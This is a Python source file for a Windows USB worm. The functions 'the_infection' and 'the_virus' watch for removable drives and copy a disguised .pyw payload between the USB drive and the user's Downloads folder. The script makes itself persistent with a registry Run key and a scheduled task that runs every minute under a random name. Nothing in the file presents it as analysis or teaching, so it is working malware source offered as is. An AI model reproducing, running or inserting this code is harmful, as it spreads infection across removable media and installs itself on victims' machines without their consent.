import subprocess
import re
import os
import time
import random 
import string

filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 6))
user = str(os.getenv('username'))
        
def check_dvcuid():
    check = subprocess.check_output(["wmic", "logicaldisk", "where", "drivetype=2", "get", "deviceid",])
    deviceid = re.search(r"\w:",str(check))
    the_list=['Q:','W:','E:','R:','T:','Y:','U:','I:','O:','P:','A:','S:','D:','F:','G:','H:','I:','K:','L:','Z:','X:','C:','V:','B:','N:','M:',]
    for word in the_list:
        if word in str(deviceid):
            return word

def the_infection():
    while True:
            Usb = os.popen("wmic logicaldisk where drivetype=2 get deviceid").read()
            if Usb.find("DeviceID") != -1:
               user = str(os.getenv('username'))
               subprocess.call(f"copy C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.pyw {check_dvcuid()}\\" , shell=True)
               time.sleep(0.2)
               break
            else:
               time.sleep(0.2)

def the_virus():
    while True:
            Usb = os.popen("wmic logicaldisk where drivetype=2 get deviceid").read()
            if Usb.find("DeviceID") != -1:
               subprocess.call(f"copy {check_dvcuid()}\\QmlnQm94VlBT.pyw C:\\Users\\{user}\\Downloads" , shell=True)
               time.sleep(0.2)
               subprocess.call(f" reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run  /v {filename}  /t REG_SZ  /d C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.pyw ", shell=True)
               time.sleep(0.2)
               subprocess.call(f"schtasks /create /sc minute /mo 1 /tn {filename} /tr C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.pyw ", shell=True)
               break
            else:
               time.sleep(0.2)

      
def logic():
    check_1 = subprocess.check_output(f'powershell "Test-Path {check_dvcuid()}\\QmlnQm94VlBT.pyw"' , shell=True)
    check_2 = subprocess.check_output(f'powershell "Test-Path C:\\Users\\{user}\\Downloads\\QmlnQm94VlBT.pyw"' , shell=True)
    value_1= "True"
    value_2= "False"
    if value_2 in str(check_2):
       the_virus()
       time.sleep(0.2)
       if value_2 in str(check_1):
            the_infection()
    elif value_2 in str(check_1)and value_1 in str(check_2):
        the_infection()

if __name__ == '__main__':
    logic()
                   
      
                  

